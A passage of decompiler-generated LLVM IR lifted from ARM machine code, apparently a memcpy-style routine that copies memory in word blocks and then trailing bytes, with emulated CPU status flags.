  %v0_1687094 = phi i32 [ %v1_16830, %dec_label_pc_16850 ], [ %v0_16a4c77, %dec_label_pc_16924 ]
  %v0_1686c93 = phi i32 [ %v0_16830, %dec_label_pc_16850 ], [ %v0_16924, %dec_label_pc_16924 ]
  %v0_16858 = phi i32 [ %v2_16840, %dec_label_pc_16850 ], [ %v2_1691c, %dec_label_pc_16924 ]
  %v1_16858 = add i32 %v0_16858, -8
  store i32 %v1_16858, i32* %r2.global-to-local, align 4
  %v3_16858 = sub i32 7, %v0_16858
  %v4_16858 = and i32 %v3_16858, %v0_16858
  %v5_16858 = icmp slt i32 %v4_16858, 0
  store i1 %v5_16858, i1* %cpsr_v.global-to-local, align 1
  %v6_16858 = icmp slt i32 %v1_16858, 0
  store i1 %v6_16858, i1* %cpsr_n.global-to-local, align 1
  %v7_16858 = icmp eq i32 %v0_16858, 8
  store i1 %v7_16858, i1* %cpsr_z.global-to-local, align 1
  %v2_1685c = xor i1 %v6_16858, %v5_16858
  br i1 %v2_1685c, label %dec_label_pc_168ac, label %dec_label_pc_16860

dec_label_pc_16860:                               ; preds = %dec_label_pc_16858
  %v1_16860 = add i32 %v0_16858, -28
  store i32 %v1_16860, i32* %r2.global-to-local, align 4
  %v3_16860 = sub i32 27, %v0_16858
  %v4_16860 = and i32 %v3_16860, %v1_16858
  %v5_16860 = icmp slt i32 %v4_16860, 0
  store i1 %v5_16860, i1* %cpsr_v.global-to-local, align 1
  %v6_16860 = icmp slt i32 %v1_16860, 0
  store i1 %v6_16860, i1* %cpsr_n.global-to-local, align 1
  %v7_16860 = icmp eq i32 %v1_16858, 20
  store i1 %v7_16860, i1* %cpsr_z.global-to-local, align 1
  %v2_16864 = xor i1 %v6_16860, %v5_16860
  br i1 %v2_16864, label %dec_label_pc_16898, label %dec_label_pc_16868

dec_label_pc_16868:                               ; preds = %dec_label_pc_16860
  %v0_16868 = load i32, i32* @r4, align 4
  store i32 %v0_16868, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1686c

dec_label_pc_1686c:                               ; preds = %dec_label_pc_1686c.dec_label_pc_1686c_crit_edge, %dec_label_pc_16868
  %v0_16870 = phi i32 [ %v12_16878, %dec_label_pc_1686c.dec_label_pc_1686c_crit_edge ], [ %v0_1687094, %dec_label_pc_16868 ]
  %v0_1686c = phi i32 [ %v0_1686c.pre, %dec_label_pc_1686c.dec_label_pc_1686c_crit_edge ], [ %v0_1686c93, %dec_label_pc_16868 ]
  %v1_1686c = inttoptr i32 %v0_1686c to i32*
  %v2_1686c = load i32, i32* %v1_1686c, align 4
  %v3_1686c = add i32 %v0_1686c, 4
  %v4_1686c = inttoptr i32 %v3_1686c to i32*
  %v5_1686c = load i32, i32* %v4_1686c, align 4
  store i32 %v5_1686c, i32* %r4.global-to-local, align 4
  %v6_1686c = add i32 %v0_1686c, 8
  %v7_1686c = inttoptr i32 %v6_1686c to i32*
  %v8_1686c = load i32, i32* %v7_1686c, align 4
  store i32 %v8_1686c, i32* %ip.global-to-local, align 4
  %v9_1686c = add i32 %v0_1686c, 12
  %v10_1686c = inttoptr i32 %v9_1686c to i32*
  %v11_1686c = load i32, i32* %v10_1686c, align 4
  store i32 %v11_1686c, i32* %lr.global-to-local, align 4
  %v12_1686c = add i32 %v0_1686c, 16
  store i32 %v12_1686c, i32* %r1.global-to-local, align 4
  %v1_16870 = inttoptr i32 %v0_16870 to i32*
  store i32 %v2_1686c, i32* %v1_16870, align 4
  %v3_16870 = add i32 %v0_16870, 4
  %v4_16870 = inttoptr i32 %v3_16870 to i32*
  %v5_16870 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16870, i32* %v4_16870, align 4
  %v6_16870 = add i32 %v0_16870, 8
  %v7_16870 = inttoptr i32 %v6_16870 to i32*
  %v8_16870 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_16870, i32* %v7_16870, align 4
  %v9_16870 = add i32 %v0_16870, 12
  %v10_16870 = inttoptr i32 %v9_16870 to i32*
  %v11_16870 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16870, i32* %v10_16870, align 4
  %v12_16870 = add i32 %v0_16870, 16
  store i32 %v12_16870, i32* %r0.global-to-local, align 4
  %v0_16874 = load i32, i32* %r1.global-to-local, align 4
  %v1_16874 = inttoptr i32 %v0_16874 to i32*
  %v2_16874 = load i32, i32* %v1_16874, align 4
  store i32 %v2_16874, i32* @r3, align 4
  %v3_16874 = add i32 %v0_16874, 4
  %v4_16874 = inttoptr i32 %v3_16874 to i32*
  %v5_16874 = load i32, i32* %v4_16874, align 4
  store i32 %v5_16874, i32* %r4.global-to-local, align 4
  %v6_16874 = add i32 %v0_16874, 8
  %v7_16874 = inttoptr i32 %v6_16874 to i32*
  %v8_16874 = load i32, i32* %v7_16874, align 4
  store i32 %v8_16874, i32* @ip, align 4
  %v9_16874 = add i32 %v0_16874, 12
  %v10_16874 = inttoptr i32 %v9_16874 to i32*
  %v11_16874 = load i32, i32* %v10_16874, align 4
  store i32 %v11_16874, i32* %lr.global-to-local, align 4
  %v12_16874 = add i32 %v0_16874, 16
  store i32 %v12_16874, i32* @r1, align 4
  %v1_16878 = inttoptr i32 %v12_16870 to i32*
  store i32 %v2_16874, i32* %v1_16878, align 4
  %v3_16878 = add i32 %v0_16870, 20
  %v4_16878 = inttoptr i32 %v3_16878 to i32*
  %v5_16878 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16878, i32* %v4_16878, align 4
  %v6_16878 = add i32 %v0_16870, 24
  %v7_16878 = inttoptr i32 %v6_16878 to i32*
  %v8_16878 = load i32, i32* @ip, align 4
  store i32 %v8_16878, i32* %v7_16878, align 4
  %v9_16878 = add i32 %v0_16870, 28
  %v10_16878 = inttoptr i32 %v9_16878 to i32*
  %v11_16878 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16878, i32* %v10_16878, align 4
  %v12_16878 = add i32 %v0_16870, 32
  store i32 %v12_16878, i32* @r0, align 4
  %v0_1687c = load i32, i32* %r2.global-to-local, align 4
  %v1_1687c = add i32 %v0_1687c, -32
  store i32 %v1_1687c, i32* %r2.global-to-local, align 4
  %v3_1687c = sub i32 31, %v0_1687c
  %v4_1687c = and i32 %v3_1687c, %v0_1687c
  %v5_1687c = icmp slt i32 %v4_1687c, 0
  %v6_1687c = icmp slt i32 %v1_1687c, 0
  %v2_16880 = xor i1 %v6_1687c, %v5_1687c
  br i1 %v2_16880, label %dec_label_pc_16884, label %dec_label_pc_1686c.dec_label_pc_1686c_crit_edge

dec_label_pc_1686c.dec_label_pc_1686c_crit_edge:  ; preds = %dec_label_pc_1686c
  %v0_1686c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1686c

dec_label_pc_16884:                               ; preds = %dec_label_pc_1686c
  %v1_16884 = add i32 %v0_1687c, -16
  %v3_16884 = add i32 %v0_1687c, 2147483616
  %v4_16884 = and i32 %v1_16884, %v3_16884
  %v5_16884 = icmp slt i32 %v4_16884, 0
  store i1 %v5_16884, i1* %cpsr_v.global-to-local, align 1
  %v6_16884 = icmp slt i32 %v1_16884, 0
  store i1 %v6_16884, i1* %cpsr_n.global-to-local, align 1
  %v7_16884 = icmp eq i32 %v1_16884, 0
  store i1 %v7_16884, i1* %cpsr_z.global-to-local, align 1
  %v2_16888 = xor i1 %v6_16884, %v5_16884
  br i1 %v2_16888, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_16884
  %v3_16888 = load i32, i32* @r1, align 4
  %v4_16888 = inttoptr i32 %v3_16888 to i32*
  %v5_16888 = load i32, i32* %v4_16888, align 4
  store i32 %v5_16888, i32* @r3, align 4
  %v6_16888 = add i32 %v3_16888, 4
  %v7_16888 = inttoptr i32 %v6_16888 to i32*
  %v8_16888 = load i32, i32* %v7_16888, align 4
  store i32 %v8_16888, i32* %r4.global-to-local, align 4
  %v9_16888 = add i32 %v3_16888, 8
  %v10_16888 = inttoptr i32 %v9_16888 to i32*
  %v11_16888 = load i32, i32* %v10_16888, align 4
  store i32 %v11_16888, i32* @ip, align 4
  %v12_16888 = add i32 %v3_16888, 12
  %v13_16888 = inttoptr i32 %v12_16888 to i32*
  %v14_16888 = load i32, i32* %v13_16888, align 4
  store i32 %v14_16888, i32* %lr.global-to-local, align 4
  %v15_16888 = add i32 %v3_16888, 16
  store i32 %v15_16888, i32* @r1, align 4
  %v4_1688c = inttoptr i32 %v12_16878 to i32*
  store i32 %v5_16888, i32* %v4_1688c, align 4
  %v6_1688c = add i32 %v0_16870, 36
  %v7_1688c = inttoptr i32 %v6_1688c to i32*
  %v8_1688c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1688c, i32* %v7_1688c, align 4
  %v9_1688c = add i32 %v0_16870, 40
  %v10_1688c = inttoptr i32 %v9_1688c to i32*
  %v11_1688c = load i32, i32* @ip, align 4
  store i32 %v11_1688c, i32* %v10_1688c, align 4
  %v12_1688c = add i32 %v0_16870, 44
  %v13_1688c = inttoptr i32 %v12_1688c to i32*
  %v14_1688c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1688c, i32* %v13_1688c, align 4
  %v15_1688c = add i32 %v0_16870, 48
  store i32 %v15_1688c, i32* @r0, align 4
  %v3_16890 = load i32, i32* %r2.global-to-local, align 4
  %v4_16890 = add i32 %v3_16890, -16
  store i32 %v4_16890, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_16884, %bb136
  %v3_168a0102111 = phi i32 [ %v15_1688c, %bb136 ], [ %v12_16878, %dec_label_pc_16884 ]
  %v0_16898.pre = phi i32 [ %v4_16890, %bb136 ], [ %v1_1687c, %dec_label_pc_16884 ]
  %v2_16894 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16894, i32* @r4, align 4
  br label %dec_label_pc_16898

dec_label_pc_16898:                               ; preds = %dec_label_pc_16860, %bb137
  %v3_168a0101 = phi i32 [ %v0_1687094, %dec_label_pc_16860 ], [ %v3_168a0102111, %bb137 ]
  %v0_16898 = phi i32 [ %v1_16860, %dec_label_pc_16860 ], [ %v0_16898.pre, %bb137 ]
  %v1_16898 = add i32 %v0_16898, 20
  store i32 %v1_16898, i32* %r2.global-to-local, align 4
  %v3_16898 = sub i32 0, %v0_16898
  %v4_16898 = and i32 %v1_16898, %v3_16898
  %v5_16898 = icmp slt i32 %v4_16898, 0
  store i1 %v5_16898, i1* %cpsr_v.global-to-local, align 1
  %v6_16898 = icmp slt i32 %v1_16898, 0
  store i1 %v6_16898, i1* %cpsr_n.global-to-local, align 1
  %v7_16898 = icmp eq i32 %v1_16898, 0
  store i1 %v7_16898, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1689c

dec_label_pc_1689c:                               ; preds = %.thread115, %dec_label_pc_16898
  %v0_168ac.pre157 = phi i32 [ %v0_168ac.pre, %.thread115 ], [ %v1_16898, %dec_label_pc_16898 ]
  %v3_168a0 = phi i32 [ %v3_168a099116, %.thread115 ], [ %v3_168a0101, %dec_label_pc_16898 ]
  %v1_168a4 = phi i1 [ %v1_168a8, %.thread115 ], [ %v5_16898, %dec_label_pc_16898 ]
  %v0_168a4 = phi i1 [ %v0_168a8, %.thread115 ], [ %v6_16898, %dec_label_pc_16898 ]
  %v2_1689c = xor i1 %v1_168a4, %v0_168a4
  br i1 %v2_1689c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_1689c
  %v3_1689c = load i32, i32* @r1, align 4
  %v4_1689c = inttoptr i32 %v3_1689c to i32*
  %v5_1689c = load i32, i32* %v4_1689c, align 4
  store i32 %v5_1689c, i32* @r3, align 4
  %v6_1689c = add i32 %v3_1689c, 4
  %v7_1689c = inttoptr i32 %v6_1689c to i32*
  %v8_1689c = load i32, i32* %v7_1689c, align 4
  store i32 %v8_1689c, i32* @ip, align 4
  %v9_1689c = add i32 %v3_1689c, 8
  %v10_1689c = inttoptr i32 %v9_1689c to i32*
  %v11_1689c = load i32, i32* %v10_1689c, align 4
  store i32 %v11_1689c, i32* %lr.global-to-local, align 4
  %v12_1689c = add i32 %v3_1689c, 12
  store i32 %v12_1689c, i32* @r1, align 4
  %v4_168a0 = inttoptr i32 %v3_168a0 to i32*
  store i32 %v5_1689c, i32* %v4_168a0, align 4
  %v6_168a0 = add i32 %v3_168a0, 4
  %v7_168a0 = inttoptr i32 %v6_168a0 to i32*
  %v8_168a0 = load i32, i32* @ip, align 4
  store i32 %v8_168a0, i32* %v7_168a0, align 4
  %v9_168a0 = add i32 %v3_168a0, 8
  %v10_168a0 = inttoptr i32 %v9_168a0 to i32*
  %v11_168a0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_168a0, i32* %v10_168a0, align 4
  %v12_168a0 = add i32 %v3_168a0, 12
  store i32 %v12_168a0, i32* @r0, align 4
  %v3_168a4 = load i32, i32* %r2.global-to-local, align 4
  %v4_168a4 = add i32 %v3_168a4, -12
  store i32 %v4_168a4, i32* %r2.global-to-local, align 4
  %v6_168a4 = sub i32 11, %v3_168a4
  %v7_168a4 = and i32 %v6_168a4, %v3_168a4
  %v8_168a4 = icmp slt i32 %v7_168a4, 0
  store i1 %v8_168a4, i1* %cpsr_v.global-to-local, align 1
  %v9_168a4 = icmp slt i32 %v4_168a4, 0
  store i1 %v9_168a4, i1* %cpsr_n.global-to-local, align 1
  %v10_168a4 = icmp eq i32 %v3_168a4, 12
  store i1 %v10_168a4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1689c, %bb138
  %v0_168ac.pre = phi i32 [ %v4_168a4, %bb138 ], [ %v0_168ac.pre157, %dec_label_pc_1689c ]
  %v3_168a099116 = phi i32 [ %v12_168a0, %bb138 ], [ %v3_168a0, %dec_label_pc_1689c ]
  %v1_168a8 = phi i1 [ %v8_168a4, %bb138 ], [ %v1_168a4, %dec_label_pc_1689c ]
  %v0_168a8 = phi i1 [ %v9_168a4, %bb138 ], [ %v0_168a4, %dec_label_pc_1689c ]
  %v2_168a8 = xor i1 %v1_168a8, %v0_168a8
  br i1 %v2_168a8, label %dec_label_pc_168ac, label %dec_label_pc_1689c

dec_label_pc_168ac:                               ; preds = %.thread115, %dec_label_pc_16858
  %v4_168bc = phi i32 [ %v0_1687094, %dec_label_pc_16858 ], [ %v3_168a099116, %.thread115 ]
  %v0_168ac = phi i32 [ %v1_16858, %dec_label_pc_16858 ], [ %v0_168ac.pre, %.thread115 ]
  %v1_168ac = add i32 %v0_168ac, 8
  store i32 %v1_168ac, i32* %r2.global-to-local, align 4
  %v3_168ac = sub i32 0, %v0_168ac
  %v4_168ac = and i32 %v1_168ac, %v3_168ac
  %v5_168ac = icmp slt i32 %v4_168ac, 0
  store i1 %v5_168ac, i1* %cpsr_v.global-to-local, align 1
  %v6_168ac = icmp slt i32 %v1_168ac, 0
  store i1 %v6_168ac, i1* %cpsr_n.global-to-local, align 1
  %v7_168ac = icmp eq i32 %v1_168ac, 0
  store i1 %v7_168ac, i1* %cpsr_z.global-to-local, align 1
  %v2_168b0 = xor i1 %v6_168ac, %v5_168ac
  br i1 %v2_168b0, label %bb140, label %dec_label_pc_168b4

dec_label_pc_168b4:                               ; preds = %dec_label_pc_168ac
  %v1_168b4 = add i32 %v0_168ac, 4
  store i32 %v1_168b4, i32* %r2.global-to-local, align 4
  %v3_168b4 = sub i32 -5, %v0_168ac
  %v4_168b4 = and i32 %v3_168b4, %v1_168ac
  %v5_168b4 = icmp slt i32 %v4_168b4, 0
  store i1 %v5_168b4, i1* %cpsr_v.global-to-local, align 1
  %v6_168b4 = icmp slt i32 %v1_168b4, 0
  store i1 %v6_168b4, i1* %cpsr_n.global-to-local, align 1
  %v7_168b4 = icmp eq i32 %v1_168ac, 4
  store i1 %v7_168b4, i1* %cpsr_z.global-to-local, align 1
  %v2_168b8 = xor i1 %v6_168b4, %v5_168b4
  %v3_168b8 = load i32, i32* @r1, align 4
  %v4_168b8 = inttoptr i32 %v3_168b8 to i32*
  %v5_168b8 = load i32, i32* %v4_168b8, align 4
  store i32 %v5_168b8, i32* @r3, align 4
  %v7_168b8 = add i32 %v3_168b8, 4
  br i1 %v2_168b8, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_168b4
  store i32 %v7_168b8, i32* @r1, align 4
  %v5_168bc = inttoptr i32 %v4_168bc to i32*
  store i32 %v5_168b8, i32* %v5_168bc, align 4
  %v6_168bc = load i32, i32* @r0, align 4
  %v7_168bc = add i32 %v6_168bc, 4
  store i32 %v7_168bc, i32* @r0, align 4
  %v0_168cc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_168b4
  %v7_168c0 = inttoptr i32 %v7_168b8 to i32*
  %v8_168c0 = load i32, i32* %v7_168c0, align 4
  store i32 %v8_168c0, i32* @ip, align 4
  %v9_168c0 = add i32 %v3_168b8, 8
  store i32 %v9_168c0, i32* @r1, align 4
  %v4_168c4 = inttoptr i32 %v4_168bc to i32*
  store i32 %v5_168b8, i32* %v4_168c4, align 4
  %v6_168c4 = add i32 %v4_168bc, 4
  %v7_168c4 = inttoptr i32 %v6_168c4 to i32*
  %v8_168c4 = load i32, i32* @ip, align 4
  store i32 %v8_168c4, i32* %v7_168c4, align 4
  %v9_168c4 = add i32 %v4_168bc, 8
  store i32 %v9_168c4, i32* @r0, align 4
  %v3_168c8 = load i32, i32* %r2.global-to-local, align 4
  %v4_168c8 = add i32 %v3_168c8, -4
  store i32 %v4_168c8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_168ac, %bb, %dec_label_pc_16a7c, %dec_label_pc_16a10, %dec_label_pc_169a4, %bb139
  %v0_168cc = phi i32 [ %v0_168cc.pre, %.thread122 ], [ %v2_1691c, %.thread128 ], [ %v1_168ac, %dec_label_pc_168ac ], [ %v2_16840, %bb ], [ %v0_168cc61, %dec_label_pc_16a7c ], [ %v0_168cc60, %dec_label_pc_16a10 ], [ %v0_168cc59, %dec_label_pc_169a4 ], [ %v4_168c8, %bb139 ]
  %v1_168cc = add i32 %v0_168cc, 4
  store i32 %v1_168cc, i32* %r2.global-to-local, align 4
  %v3_168cc = sub i32 0, %v0_168cc
  %v4_168cc = and i32 %v1_168cc, %v3_168cc
  %v5_168cc = icmp slt i32 %v4_168cc, 0
  store i1 %v5_168cc, i1* %cpsr_v.global-to-local, align 1
  %v6_168cc = icmp slt i32 %v1_168cc, 0
  store i1 %v6_168cc, i1* %cpsr_n.global-to-local, align 1
  %v7_168cc = icmp eq i32 %v1_168cc, 0
  store i1 %v7_168cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_168cc, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_168d4.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_168d0 = load i8*, i8** %stack_var_-8, align 4
  %v4_168d0 = ptrtoint i8* %v3_168d0 to i32
  store i32 %v4_168d0, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_168d4 = phi i32 [ %v0_168d4.pre, %bb140.bb142_crit_edge ], [ %v8_1683c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_168cc, i32 %v0_168d4)
  %v0_168d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_168d8 = add i32 %v0_168d8, -2
  %v3_168d8 = sub i32 1, %v0_168d8
  %v4_168d8 = and i32 %v3_168d8, %v0_168d8
  %v5_168d8 = icmp slt i32 %v4_168d8, 0
  store i1 %v5_168d8, i1* %cpsr_v.global-to-local, align 1
  %v6_168d8 = icmp slt i32 %v1_168d8, 0
  store i1 %v6_168d8, i1* %cpsr_n.global-to-local, align 1
  %v7_168d8 = icmp eq i32 %v0_168d8, 2
  store i1 %v7_168d8, i1* %cpsr_z.global-to-local, align 1
  %v0_168dc = load i32, i32* @r1, align 4
  %v1_168dc = inttoptr i32 %v0_168dc to i8*
  %v2_168dc = load i8, i8* %v1_168dc, align 1
  %v5_168dc = add i32 %v0_168dc, 1
  store i32 %v5_168dc, i32* %r1.global-to-local, align 4
  %v2_168e0 = load i32, i32* @r0, align 4
  %v3_168e0 = inttoptr i32 %v2_168e0 to i8*
  store i8 %v2_168dc, i8* %v3_168e0, align 1
  %v4_168e0 = load i32, i32* @r0, align 4
  %v5_168e0 = add i32 %v4_168e0, 1
  store i32 %v5_168e0, i32* %r0.global-to-local, align 4
  %v0_168e4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_168e4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_168e4 = xor i1 %v0_168e4, %v1_168e4
  br i1 %v2_168e4, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_168e4 = load i32, i32* %r1.global-to-local, align 4
  %v4_168e4 = inttoptr i32 %v3_168e4 to i8*
  %v5_168e4 = load i8, i8* %v4_168e4, align 1
  %v8_168e4 = add i32 %v3_168e4, 1
  store i32 %v8_168e4, i32* %r1.global-to-local, align 4
  %v6_168e8 = inttoptr i32 %v5_168e0 to i8*
  store i8 %v5_168e4, i8* %v6_168e8, align 1
  %v7_168e8 = load i32, i32* %r0.global-to-local, align 4
  %v8_168e8 = add i32 %v7_168e8, 1
  store i32 %v8_168e8, i32* %r0.global-to-local, align 4
  %v1_168ec.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_168ec.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_168f0 = phi i32 [ %v8_168e8, %bb143 ], [ %v5_168e0, %bb142 ]
  %v2_168f0 = phi i1 [ %v2_168ec.pre, %bb143 ], [ %v1_168e4, %bb142 ]
  %v1_168f0 = phi i1 [ %v1_168ec.pre, %bb143 ], [ %v0_168e4, %bb142 ]
  %v0_168ec = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_168ec = xor i1 %v2_168f0, %v1_168f0
  %v4_168ec = or i1 %v0_168ec, %v3_168ec
  br i1 %v4_168ec, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_168ec = load i32, i32* %r1.global-to-local, align 4
  %v6_168ec = inttoptr i32 %v5_168ec to i8*
  %v7_168ec = load i8, i8* %v6_168ec, align 1
  %v10_168ec = add i32 %v5_168ec, 1
  store i32 %v10_168ec, i32* %r1.global-to-local, align 4
  %v8_168f0 = inttoptr i32 %v7_168f0 to i8*
  store i8 %v7_168ec, i8* %v8_168f0, align 1
  %v9_168f0 = load i32, i32* %r0.global-to-local, align 4
  %v10_168f0 = add i32 %v9_168f0, 1
  store i32 %v10_168f0, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_168f4 = load i8*, i8** %stack_var_-8, align 4
  %v3_168f4 = ptrtoint i8* %v2_168f4 to i32
  store i32 %v3_168f4, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_1683c)
  %v0_168fc.pre = load i32, i32* @ip, align 4
  %v0_16904.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_16908.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_168fc

dec_label_pc_168fc:                               ; preds = %dec_label_pc_16848, %.thread126
  %v2_16908 = phi i32 [ %v1_16830, %dec_label_pc_16848 ], [ %v2_16908.pre, %.thread126 ]
  %v0_16904 = phi i32 [ %v0_16830, %dec_label_pc_16848 ], [ %v0_16904.pre, %.thread126 ]
  %v0_168fc = phi i32 [ %v1_16848, %dec_label_pc_16848 ], [ %v0_168fc.pre, %.thread126 ]
  %v1_168fc = sub i32 4, %v0_168fc
  store i32 %v1_168fc, i32* @ip, align 4
  %v1_16900 = add i32 %v1_168fc, -2
  %v3_16900 = sub i32 1, %v1_168fc
  %v4_16900 = and i32 %v3_16900, %v1_168fc
  %v5_16900 = icmp slt i32 %v4_16900, 0
  store i1 %v5_16900, i1* %cpsr_v.global-to-local, align 1
  %v6_16900 = icmp slt i32 %v1_16900, 0
  store i1 %v6_16900, i1* %cpsr_n.global-to-local, align 1
  %v7_16900 = icmp eq i32 %v1_168fc, 2
  store i1 %v7_16900, i1* %cpsr_z.global-to-local, align 1
  %v1_16904 = inttoptr i32 %v0_16904 to i8*
  %v2_16904 = load i8, i8* %v1_16904, align 1
  %v3_16904 = zext i8 %v2_16904 to i32
  store i32 %v3_16904, i32* @r3, align 4
  %v5_16904 = add i32 %v0_16904, 1
  store i32 %v5_16904, i32* @r1, align 4
  %v3_16908 = inttoptr i32 %v2_16908 to i8*
  store i8 %v2_16904, i8* %v3_16908, align 1
  %v4_16908 = load i32, i32* @r0, align 4
  %v5_16908 = add i32 %v4_16908, 1
  store i32 %v5_16908, i32* @r0, align 4
  %v0_1690c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1690c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1690c = xor i1 %v0_1690c, %v1_1690c
  br i1 %v2_1690c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_168fc
  %v3_1690c = load i32, i32* @r1, align 4
  %v4_1690c = inttoptr i32 %v3_1690c to i8*
  %v5_1690c = load i8, i8* %v4_1690c, align 1
  %v6_1690c = zext i8 %v5_1690c to i32
  store i32 %v6_1690c, i32* @r3, align 4
  %v8_1690c = add i32 %v3_1690c, 1
  store i32 %v8_1690c, i32* @r1, align 4
  %v6_16910 = inttoptr i32 %v5_16908 to i8*
  store i8 %v5_1690c, i8* %v6_16910, align 1
  %v7_16910 = load i32, i32* @r0, align 4
  %v8_16910 = add i32 %v7_16910, 1
  store i32 %v8_16910, i32* @r0, align 4
  %v1_16914.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16914.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_168fc, %bb145
  %v7_16918 = phi i32 [ %v8_16910, %bb145 ], [ %v5_16908, %dec_label_pc_168fc ]
  %v2_16918 = phi i1 [ %v2_16914.pre, %bb145 ], [ %v1_1690c, %dec_label_pc_168fc ]
  %v1_16918 = phi i1 [ %v1_16914.pre, %bb145 ], [ %v0_1690c, %dec_label_pc_168fc ]
  %v0_16914 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16914 = xor i1 %v2_16918, %v1_16918
  %v4_16914 = or i1 %v0_16914, %v3_16914
  br i1 %v4_16914, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_16914 = load i32, i32* @r1, align 4
  %v6_16914 = inttoptr i32 %v5_16914 to i8*
  %v7_16914 = load i8, i8* %v6_16914, align 1
  %v8_16914 = zext i8 %v7_16914 to i32
  store i32 %v8_16914, i32* @r3, align 4
  %v10_16914 = add i32 %v5_16914, 1
  store i32 %v10_16914, i32* @r1, align 4
  %v8_16918 = inttoptr i32 %v7_16918 to i8*
  store i8 %v7_16914, i8* %v8_16918, align 1
  %v9_16918 = load i32, i32* @r0, align 4
  %v10_16918 = add i32 %v9_16918, 1
  store i32 %v10_16918, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_16a4c77 = phi i32 [ %v10_16918, %bb146 ], [ %v7_16918, %.thread127 ]
  %v0_1691c = load i32, i32* %r2.global-to-local, align 4
  %v1_1691c = load i32, i32* @ip, align 4
  %v2_1691c = sub i32 %v0_1691c, %v1_1691c
  store i32 %v2_1691c, i32* %r2.global-to-local, align 4
  %v4_1691c = xor i32 %v1_1691c, %v0_1691c
  %v5_1691c = xor i32 %v2_1691c, %v0_1691c
  %v6_1691c = and i32 %v5_1691c, %v4_1691c
  %v7_1691c = icmp slt i32 %v6_1691c, 0
  store i1 %v7_1691c, i1* %cpsr_v.global-to-local, align 1
  %v8_1691c = icmp slt i32 %v2_1691c, 0
  store i1 %v8_1691c, i1* %cpsr_n.global-to-local, align 1
  %v9_1691c = icmp eq i32 %v0_1691c, %v1_1691c
  store i1 %v9_1691c, i1* %cpsr_z.global-to-local, align 1
  %v2_16920 = xor i1 %v8_1691c, %v7_1691c
  br i1 %v2_16920, label %bb140, label %dec_label_pc_16924

dec_label_pc_16924:                               ; preds = %.thread128
  %v0_16924 = load i32, i32* @r1, align 4
  %v1_16924 = urem i32 %v0_16924, 4
  store i32 %v1_16924, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16924 = icmp eq i32 %v1_16924, 0
  store i1 %v2_16924, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_16924 to i2
  br i1 %v2_16924, label %dec_label_pc_16858, label %dec_label_pc_1692c

dec_label_pc_1692c:                               ; preds = %dec_label_pc_16850, %dec_label_pc_16924
  %v0_16a4c76 = phi i32 [ %v1_16830, %dec_label_pc_16850 ], [ %v0_16a4c77, %dec_label_pc_16924 ]
  %v0_169b4 = phi i32 [ %v2_16840, %dec_label_pc_16850 ], [ %v2_1691c, %dec_label_pc_16924 ]
  %v0_16934.off0 = phi i2 [ %extract.t, %dec_label_pc_16850 ], [ %extract.t131, %dec_label_pc_16924 ]
  %v0_1692c = phi i32 [ %v0_16830, %dec_label_pc_16850 ], [ %v0_16924, %dec_label_pc_16924 ]
  %v1_1692c = and i32 %v0_1692c, -4
  store i32 %v1_1692c, i32* %r1.global-to-local, align 4
  %v1_16930 = inttoptr i32 %v1_1692c to i32*
  %v2_16930 = load i32, i32* %v1_16930, align 4
  store i32 %v2_16930, i32* %lr.global-to-local, align 4
  %v4_16930 = add i32 %v1_1692c, 4
  store i32 %v4_16930, i32* %r1.global-to-local, align 4
  %v1_169ac = add i32 %v0_169b4, -12
